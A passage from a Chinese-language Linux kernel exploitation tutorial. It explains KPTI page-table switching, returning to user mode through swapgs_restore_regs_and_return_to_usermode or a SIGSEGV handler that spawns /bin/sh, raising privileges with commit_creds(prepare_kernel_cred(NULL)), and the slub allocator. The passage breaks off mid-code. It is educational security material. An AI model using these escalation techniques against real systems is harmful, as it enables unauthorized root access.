<code>swapgs; iret</code>
返回用户态，而是在返回用户态之前还需要将用户进程的页表给切换回来</p>
<p>众所周知 Linux 采用四级页表结构（PGD-&gt;PUD-&gt;PMD-&gt;PTE），而
CR3 控制寄存器用以存储当前的 PGD 的地址，因此在开启 KPTI
的情况下用户态与内核态之间的切换便涉及到 CR3
的切换，为了提高切换的速度，内核将内核空间的 PGD 与用户空间的 PGD
两张页全局目录表放在一段连续的内存中（两张表，一张一页4k，总计8k，内核空间的在低地址，用户空间的在高地址），这样只需要将
CR3 的第 13 位取反便能完成页表切换的操作 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/248d52bc78f674d3af4f30326f6a0d3f.png"
                     
alt="在这里插入图片描述" 
                >
需要进行说明的是，在这两张页表上都有着对用户内存空间的完整映射，但在用户页表中只映射了少量的内核代码（例如系统调用入口点、中断处理等），而只有在内核页表中才有着对内核内存空间的完整映射，如下图所示，左侧是未开启
KPTI 后的页表布局，右侧是开启了 KPTI 后的页表布局 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/b8339a49544b7c530101ae2730a11e59.png"
                     
alt="在这里插入图片描述" 
                > KPTI
同时还令内核页表中用户地址空间部分对应的页顶级表项不再拥有执行权限（NX），这使得
ret2usr 彻底成为过去式</p>
<p>除了在系统调用入口中将用户态页表切换到内核态页表的代码外，内核也相应地在
<code>arch/x86/entry/entry_64.S</code>
中提供了一个用于完成内核态页表切换回到用户态页表的函数
<code>swapgs_restore_regs_and_return_to_usermode</code>，地址可以在
<code>/proc/kallsyms</code> 中获得。</p>
<p><code>swapgs_restore_regs_and_return_to_usermode</code>
定义如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xffffffff81c00fb0 &lt;swapgs_restore_regs_and_return_to_usermode&gt;:	nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">0xffffffff81c00fb5 &lt;swapgs_restore_regs_and_return_to_usermode+5&gt;:	pop    r15</span><br><span class="line">0xffffffff81c00fb7 &lt;swapgs_restore_regs_and_return_to_usermode+7&gt;:	pop    r14</span><br><span class="line">0xffffffff81c00fb9 &lt;swapgs_restore_regs_and_return_to_usermode+9&gt;:	pop    r13</span><br><span class="line">0xffffffff81c00fbb &lt;swapgs_restore_regs_and_return_to_usermode+11&gt;:	pop    r12</span><br><span class="line">0xffffffff81c00fbd &lt;swapgs_restore_regs_and_return_to_usermode+13&gt;:	pop    rbp</span><br><span class="line">0xffffffff81c00fbe &lt;swapgs_restore_regs_and_return_to_usermode+14&gt;:	pop    rbx</span><br><span class="line">0xffffffff81c00fbf &lt;swapgs_restore_regs_and_return_to_usermode+15&gt;:	pop    r11</span><br><span class="line">0xffffffff81c00fc1 &lt;swapgs_restore_regs_and_return_to_usermode+17&gt;:	pop    r10</span><br><span class="line">0xffffffff81c00fc3 &lt;swapgs_restore_regs_and_return_to_usermode+19&gt;:	pop    r9</span><br><span class="line">0xffffffff81c00fc5 &lt;swapgs_restore_regs_and_return_to_usermode+21&gt;:	pop    r8</span><br><span class="line">0xffffffff81c00fc7 &lt;swapgs_restore_regs_and_return_to_usermode+23&gt;:	pop    rax</span><br><span class="line">0xffffffff81c00fc8 &lt;swapgs_restore_regs_and_return_to_usermode+24&gt;:	pop    rcx</span><br><span class="line">0xffffffff81c00fc9 &lt;swapgs_restore_regs_and_return_to_usermode+25&gt;:	pop    rdx</span><br><span class="line">0xffffffff81c00fca &lt;swapgs_restore_regs_and_return_to_usermode+26&gt;:	pop    rsi</span><br><span class="line">0xffffffff81c00fcb &lt;swapgs_restore_regs_and_return_to_usermode+27&gt;:	mov    rdi,rsp</span><br><span class="line">0xffffffff81c00fce &lt;swapgs_restore_regs_and_return_to_usermode+30&gt;:	mov    rsp,QWORD PTR gs:0x6004</span><br><span class="line">0xffffffff81c00fd7 &lt;swapgs_restore_regs_and_return_to_usermode+39&gt;:	push   QWORD PTR [rdi+0x30]</span><br><span class="line">0xffffffff81c00fda &lt;swapgs_restore_regs_and_return_to_usermode+42&gt;:	push   QWORD PTR [rdi+0x28]</span><br><span class="line">0xffffffff81c00fdd &lt;swapgs_restore_regs_and_return_to_usermode+45&gt;:	push   QWORD PTR [rdi+0x20]</span><br><span class="line">0xffffffff81c00fe0 &lt;swapgs_restore_regs_and_return_to_usermode+48&gt;:	push   QWORD PTR [rdi+0x18]</span><br><span class="line">0xffffffff81c00fe3 &lt;swapgs_restore_regs_and_return_to_usermode+51&gt;:	push   QWORD PTR [rdi+0x10]</span><br><span class="line">0xffffffff81c00fe6 &lt;swapgs_restore_regs_and_return_to_usermode+54&gt;:	push   QWORD PTR [rdi]</span><br><span class="line">0xffffffff81c00fe8 &lt;swapgs_restore_regs_and_return_to_usermode+56&gt;:	push   rax</span><br><span class="line">0xffffffff81c00fe9 &lt;swapgs_restore_regs_and_return_to_usermode+57&gt;:	xchg   ax,ax</span><br><span class="line">0xffffffff81c00feb &lt;swapgs_restore_regs_and_return_to_usermode+59&gt;:	mov    rdi,cr3</span><br><span class="line">0xffffffff81c00fee &lt;swapgs_restore_regs_and_return_to_usermode+62&gt;:	jmp    0xffffffff81c01024 </span><br><span class="line"></span><br><span class="line">0xffffffff81c01024 &lt;swapgs_restore_regs_and_return_to_usermode+116&gt;:	or     rdi,0x1000</span><br><span class="line">0xffffffff81c0102b &lt;swapgs_restore_regs_and_return_to_usermode+123&gt;:	mov    cr3,rdi</span><br><span class="line">0xffffffff81c0102e &lt;swapgs_restore_regs_and_return_to_usermode+126&gt;:	pop    rax</span><br><span class="line">0xffffffff81c0102f &lt;swapgs_restore_regs_and_return_to_usermode+127&gt;:	pop    rdi</span><br><span class="line">0xffffffff81c01030 &lt;swapgs_restore_regs_and_return_to_usermode+128&gt;:	swapgs </span><br><span class="line">0xffffffff81c01033 &lt;swapgs_restore_regs_and_return_to_usermode+131&gt;:	jmp    0xffffffff81c01060 &lt;native_iret&gt;</span><br><span class="line"></span><br><span class="line">0xffffffff81c01060 &lt;native_iret&gt;:	test   BYTE PTR [rsp+0x20],0x4</span><br><span class="line">0xffffffff81c01065 &lt;native_iret+5&gt;:	jne    0xffffffff81c01069 &lt;native_irq_return_ldt&gt;</span><br><span class="line">0xffffffff81c01067 &lt;native_irq_return_iret&gt;:	iretq </span><br></pre></td></tr></table></figure></div>
<p>大概操作如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov  rdi, cr3</span><br><span class="line">or rdi, 0x1000</span><br><span class="line">mov  cr3, rdi</span><br><span class="line">pop rax</span><br><span class="line">pop rdi</span><br><span class="line">swapgs</span><br><span class="line">iretq</span><br></pre></td></tr></table></figure></div>
<p>前面对寄存器赋值的操作与 <code>pt_regs</code> 结构体对应</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">pt_regs</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3ee0687ee68d9de9d42881361d331098.png"
                     
alt="在这里插入图片描述" 
                > 另外如果找不到
<code>swapgs_restore_regs_and_return_to_usermode</code> 函数可以把
<code>get_shell</code> 函数注册为 <code>SIGSEGV</code>
信号处理函数，然后再用 swapgs + iretq 的方式返回。当出现异常时会跳转到
<code>get_shell</code> 函数继续执行，这样就完成了用户态的返回。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">signal(SIGSEGV, (<span class="type">void</span> (*)(<span class="type">int</span>)) get_shell);</span><br></pre></td></tr></table></figure></div> 上面这段代码本质就是在程序的段错误信号注册了一个
<code>get_shell</code> 回调函数。开启 KPIT 后 swapgs + iretq
的方式返回位切换页表，执行用户空间代码触发段错误回调
<code>get_shell</code> 函数。而回调 <code>get_shell</code>
函数前也会有系统态到用户态的切换，此时完成了页表和栈的正确切换（栈 0x10
对齐），确保执行 <code>get_shell</code> 函数不会出问题。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    signal(SIGSEGV, (<span class="type">void</span> (*)(<span class="type">int</span>)) get_shell);</span><br><span class="line">    *(<span class="type">size_t</span> *) <span class="number">0x114514</span> = <span class="number">0x1919810</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
### 关于 <code>syscall</code>
系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如
IO
操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如
scanf，puts 等 IO 相关的函数实际上是对系统调用的封装 （read 和
write)）。 <code>Int $0x80</code>
指令的目的是产生一个编号为128的编程异常，这个编程异常对应的是中断描述符表
IDT 中的第 128
项——也就是对应的系统门描述符。门描述符中含有一个预设的内核空间地址，它指向系统调用处理程程序：<code>system_call()</code>
。 ## 进程权限管理 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0efc0cedf397c0dfec156cce07f576aa.png"
                     
alt="在这里插入图片描述" 
                > 注意到 <code>task_struct</code>
的源码中有如下代码： <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">cred</span> __rcu		*ptracer_cred;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">cred</span> __rcu		*real_cred;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">cred</span> __rcu		*cred;</span><br></pre></td></tr></table></figure></div> <strong>Process credentials</strong>
是 kernel 用以判断一个进程权限的凭证，在 kernel 中使用 <code>cred</code>
结构体进行标识，对于一个进程而言应当有三个 <code>cred</code> ：</p>
<ul>
<li><strong><code>ptracer_cred</code>：</strong> 使用
<code>ptrace</code> 系统调用跟踪该进程的上级进程的 <code>cred</code>（
gdb
调试便是使用了这个系统调用，常见的反调试机制的原理便是提前占用了这个位置）。</li>
<li><strong><code>real_cred</code>：</strong>即<strong>客体凭证</strong>（<strong>objective
cred</strong>），通常是一个进程最初启动时所具有的权限。</li>
<li><strong><code>cred</code>：</strong>即<strong>主体凭证</strong>（<strong>subjective
cred</strong>），该进程的有效 <code>cred</code> ，kernel
以此作为进程权限的凭证。</li>
</ul>
<h3 id="进程权限凭证-cred-结构体">进程权限凭证： <code>cred</code>
结构体</h3>
<p>对于一个进程，在内核当中使用一个结构体 <code>cred</code>
管理其权限，该结构体定义于内核源码 <code>include/linux/cred.h</code>
中，如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">cred</span> &#123;</span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*session_keyring; <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*process_keyring; <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*thread_keyring; <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*request_key_auth; <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">user_struct</span> *user;	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">user_namespace</span> *user_ns; <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">group_info</span> *group_info;	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">rcu_head</span>	rcu;		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>
<p>我们主要关注 <code>cred</code> 结构体中管理权限的变量</p>
<h3 id="用户-id-和组-id">用户 ID 和组 ID</h3>
<p>一个 <code>cred</code> 结构体中记载了<strong>一个进程四种不同的用户
ID</strong>：</p>
<ul>
<li>用户真实 ID（<code>real UID</code>）:标识一个进程启动时的用户
ID</li>
<li>保存用户 ID（<code>saved UID</code>）：标识一个进程最初的有效用户
ID</li>
<li>有效用户
ID（<code>effective UID</code>）：标识一个进程正在运行时所属的用户
ID</li>
<li>文件系统用户
ID（<code>UID for VFS ops</code>）：标识一个进程创建文件时进行标识的用户
ID</li>
</ul>
<p>通常情况下这四个值都是相同的。</p>
<p>用户组 ID
同样分为四个：真实组、保存组、有效组、文件系统组与上面类似。 ### 提权
通过前面我们可以知道，只要我们改变一个进程的 <code>cred</code>
结构体，就能改变其执行权限。</p>
<p>内核空间下面有两个函数，都位于 <code>kernel/cred.c</code> 中：</p>
<ul>
<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的
<code>cred</code> 结构体，并返回一个新的 <code>cred</code>
结构体，需要注意的是 <code>daemon</code>
参数应为有效的进程描述符地址或者 NULL 。</li>
<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程。</li>
</ul>
<p>查看<code>prepare_kernel_cred()</code>函数源码，观察到如下逻辑：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (daemon)</span><br><span class="line">		old = get_task_cred(daemon);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		old = get_cred(&amp;init_cred);</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<p>在 <code>prepare_kernel_cred()</code> 函数中，若传入的参数为 NULL
，则会缺省使用 <code>init</code> 进程的 <code>cred</code>
作为模板进行拷贝，<strong>即可以直接获得一个标识着 root 权限的 cred
结构体</strong>。那么我们不难想到，只要我们能够在内核空间执行
<code>commit_creds(prepare_kernel_cred(NULL))</code>
，那么就能够将进程的权限提升到 root。</p>
<p>如果进行 ROP 提权有一个难点就是寻找将 rax 赋值给 rdi 的 gadget
。可以尝试搜索 <code>xchg rax, rdi</code>
，<code>push rax; pop rdi</code>，<code>mov rdi, rax</code> 等 gadget
。</p>
<p>另外 <code>init_cred</code> 是在内核当中有一个特殊的
<code>cred</code> ，它是 <code>init</code> 进程的 <code>cred</code>
，因此其权限为 root ，且该 <code>cred</code>
并非是动态分配的，因此当我们泄露出内核基址之后我们也便能够获得
<code>init_cred</code> 的地址，那么我们就只需要执行一次
<code>commit_creds(&amp;init_cred)</code>
便能完成提权，不过有些内核中没有
<code>init_cred</code>（实际上多数情况是由于缺少符号找不到
<code>init_cred</code>，因此需要逆向分析
<code>prepare_kernel_cred</code> 函数来定位 <code>init_cred</code>）。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/05061c3e0eb8ab90b2b3f95cefd42fe9.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h2 id="io">IO</h2>
<p>UNIX/Linux 追求高层次抽象上的统一，其设计哲学之一便是万物皆文件。 ###
万物皆文件 UNIX/Linux 设计的哲学之一 —— 万物皆文件，在 Linux
系统的视角下，无论是文件、设备、管道、还是目录，进程，甚至是磁盘，套接字等等，一切都可以被抽象成文件，一切都可以使用访问文件的方式进行操作:</p>
<p>通过这种哲学，Linux提供了操作的同一性:</p>
<ul>
<li><strong>所有的读取操作都可以通过 <code>read</code>
进行</strong></li>
<li><strong>所有的更改操作都可以通过 <code>write</code> 进行</strong>
### 进程文件系统
用以描述一个进程，其中包括一个该进程所打开的文件描述符、堆栈内存布局、环境变量等</li>
</ul>
<p>进程文件系统本身是一个伪文件系统，通常被挂载到 <code>/proc</code>
目录下，并不真正占用存储，而是占用一定的内存</p>
<p>当一个进程被建立起来时，其进程文件系统便会挂载到
<code>/proc/[PID]</code> 下，我们可以在该目录下查看其相关信息。 ###
文件描述符
进程通过文件描述符来完成对文件的访问，其在形式上是一个非负整数，本质上是对文件的索引值，进程所有执行
I/O 操作的系统调用都会通过文件描述符。</p>
<p>每个进程都独立有着一个文件描述符表，存放着该进程所打开的文件索引，每当进程成功打开一个现有文件/创建一个新文件时（通过系统调用
<code>open</code> 进行操作），内核会向进程返回一个文件描述符。</p>
<p>在 kernel 中有着一个文件表，由所有的进程共享。</p>
<p>每个 <code>*NIX</code> 进程都应当有着三个标准的 POSIX
文件描述符，对应着三个标准文件流：</p>
<ul>
<li><code>stdin</code>：标准输入 = 0</li>
<li><code>stdout</code>：标准输出 = 1</li>
<li><code>stderr</code>：标准错误 = 2</li>
</ul>
<p>后面打开的文件描述符应当从标号 3 起始。 ### 系统调用：ioctl
在<code>*NIX</code>中一切都可以被视为文件，因为一切都可以访问文件的方式进行操作，<code>Linux</code>定义了系统调用<code>ioctl</code>供进程与设备之间进行通信</p>
<p>系统调用<code>ioctl</code>是一个用于设备输入输出操作的一个系统调用，调用方式如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd,<span class="type">unsigned</span> <span class="type">long</span> request, ...)</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>fd</code>：设备的文件描述符</li>
<li><code>request</code>：请求码</li>
<li>其他参数</li>
</ul>
<p>对于一个提供了ioctl通信方式的设备而言，我们可以通过其文件描述符、使用不同的请求码及其他请求参数通过ioctl系统调用完成不同的对设备的I/O操作</p>
<blockquote>
<p>例如CD-ROM驱动程序弹出光驱的这一操作就对应着对“光驱设备”这一文件通过ioctl传递特定的请求码与请求参数完成</p>
</blockquote>
<h2 id="内存管理">内存管理</h2>
<p>具体分析见 <a class="link" 
 href="https://sky123.blog.csdn.net/article/details/130163993" >linux
内核内存管理 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。 ### 物理内存 线性映射区是 linux
内核中的一个特殊的内存区域，这块内存映射是物理机上的所有物理内存。
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</span><br></pre></td></tr></table></figure></div> <code>vmemmap</code> 是一个虚拟 <code>page</code>
数组，存放了 linux 所有物理页对应的 <code>page</code> 。
<code>page</code> 数组，线性映射区和物理内存三者是线性映射的关系。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3e3c2449e2a737aed1da834761c0d355.png"
                     
alt="在这里插入图片描述" 
                > ### buddy system <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/49fb3d6cbe9fed7e2280b4b4a6f20bad.png"
                     
alt="在这里插入图片描述" 
                > buddy system 中内存管理的一个例子： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/b208933c9362745faccf49d8f545ae8d.png"
                     
alt="在这里插入图片描述" 
                >
这个例子中，分配的最小单位是64K，初始时的最大块order=4.
依次进行下面的操作 - 初始状态 - 分配块A 34K, order=0. -
没有order为0的块，切分order=4的块为2个order=3的块. -
仍然没有order=0的块，再切分order=3的块. -
仍然没有order=0的块，再切分order=2的块. -
仍然没有order=0的块，再切分order=1的块. - 将order=0的块返回. - 分配块B
66K, order=1. 已经有了，直接返回. - 分配块C 35K, order=0.
也已经有了，直接返回. - 分配块D 67K, order=1. 切分一个order=2的块，返回.
- 块B释放. -
块D释放，因为与其后面的order=1的块是第5步分裂得来的，再将其合并为order=2的块.
- 块A释放. - 块C释放，依次合并. ### slub <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a7b2a1a75b2154f05c6763d98d2c3eb7.png"
                      alt="img" 
                > #### 关于
object slab
以页为基本单位切割，然后用单向链表(fd指针)串起来，类似用户态堆的
fastbin，每一个小块我们叫它 object 。</p>
<p><strong>注意：object 的 freelist 指针偏移是 kmem_cache.offset 而不是
0，虽然大多数情况 kmem_cache.offset 默认为 0 。</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">set_freepointer</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *object, <span class="type">void</span> *fp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> freeptr_addr = (<span class="type">unsigned</span> <span class="type">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	*(<span class="type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>object 结构如下图所示： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/80fbfc5452e6ee425f7676a492aef25a.png"
                     
alt="在这里插入图片描述" 
                > #### kmem_cache 创建 slub
分配器把伙伴系统提供的内存内存切割成特定大小的块，进行内核的小内存分配。</p>
<p>具体来说，内核会预先定义一些 <code>kmem_cache</code>
结构体，它保存着要如何分割使用内存页的信息，可以通过
<code>cat /proc/slabinfo</code> 查看系统当前可用的
<code>kmem_cache</code> 。</p>
<p>内核很多的结构体会频繁的申请和释放内存，用 <code>kmem_cache</code>
来管理特定的结构体所需要申请的内存效率上就会比较高，也比较节省内存。默认会创建
<code>kmalloc-8k</code> ，<code>kmalloc-4k</code>，...
，<code>kmalloc-16</code> ，<code>kmalloc-8</code> 这样的 cache
，<code>kmem_cache</code> 的名称以及大小使用
<code>struct kmalloc_info_struct</code> 管理。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123; </span><br><span class="line">    &#123;<span class="literal">NULL</span>,                        <span class="number">0</span>&#125;,     &#123;<span class="string">&quot;kmalloc-96&quot;</span>,             <span class="number">96</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-192&quot;</span>,           <span class="number">192</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8&quot;</span>,               <span class="number">8</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16&quot;</span>,             <span class="number">16</span>&#125;,     &#123;<span class="string">&quot;kmalloc-32&quot;</span>,             <span 